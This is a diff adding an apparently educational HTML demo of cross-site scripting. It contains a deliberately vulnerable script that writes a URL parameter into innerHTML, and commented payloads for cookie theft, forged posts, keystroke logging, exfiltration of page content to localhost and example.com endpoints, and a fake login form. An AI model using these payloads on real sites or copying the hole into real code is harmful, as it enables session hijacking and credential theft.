@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h2>XSS Attck</h2>
+    <h3>Welcome, <span id="name"></span></h3>
+
+    <!-- For Example 1 -->
+    <script>
+        //Function setCookie mostly this will be in the server
+        function setCookie(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + date.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/";
+        }
+
+        //Example: set a cookie named "exampleCookie"
+        setCookie("exampleCookie", "Hello,Cookie!", 7)
+    </script>
+
+    <!-- For Example 2 -->
+    <script>
+        function createPost(title, description) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", '/post', true);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader(
+                "Content-type",
+                "application/x-www-form-urlencoded"
+            );
+            xhr.send(`txtName=${title}&mtxMessage=${description}`);
+        }
+    </script>
+
+    <!-- Vulnerable Code -->
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get("name");
+        document.getElementById('name').innerHTML = name;
+    </script>
+</body>
+
+</html>
+
+
+<!-- example 1: user session hijacking
+    <img src=\"does-not-exist\" onerror=\"
+        var img = document.createElement(\'img\');
+        img.src = `http://localhost:5001/cookie?data=${document.cookie}`;
+        document.querySelector(\'body\').appendChild(img);
+    \"> -->
+
+
+<!-- example 2: Unauthorized activities
+    <img src=\"does-not-exist\" onerror=\"
+        createPost(\'Hacker\',\'Got Hacked\');
+    \"> -->
+
+<!-- example 3: Capturing KeyStrokes
+    <img src=\"does-not-exist\" onerror=\'
+    var timeout; 
+    var buffer; 
+    document.querySelector(\"body\").addEventListener(\"keypress\", (event) => { 
+    if (event.which !== 0) { clearTimeout(timeout);
+    buffer += String.fromCharCode(event.which); 
+    timeout = setTimeout(() => { 
+    var xhr = new XMLHttpRequest(); 
+    var uri = \"http://localhost:3001/keys?data=\"+ encodeURIComponent(buffer); 
+    xhr.open(\"GET\", uri); 
+    xhr.send(); 
+    buffer = \"\"; 
+    }, 400); 
+    }});\'/> -->
+
+<!-- example 4: Stealing Critical Information
+    <img src=\"does-not-exist\" onerror=\"
+        new Image().src=`https://example.com/fake?output=${document.body.innerHTML}`;
+    \"> -->
+
+<!-- example 5: Phishing Attack
+    <h3>Phishing Attack</h3>
+    <form action='https://example.com/fakePage.php'>
+        UserName:</br>
+        <input type="text" placeholder="Enter UserName" name="username"/></br>
+        Password:</br>
+        <input type="password" placeholder="Enter Password" name="password"/></br>
+        <input type="submit" value="Login"></br>
+    </form>
+-->
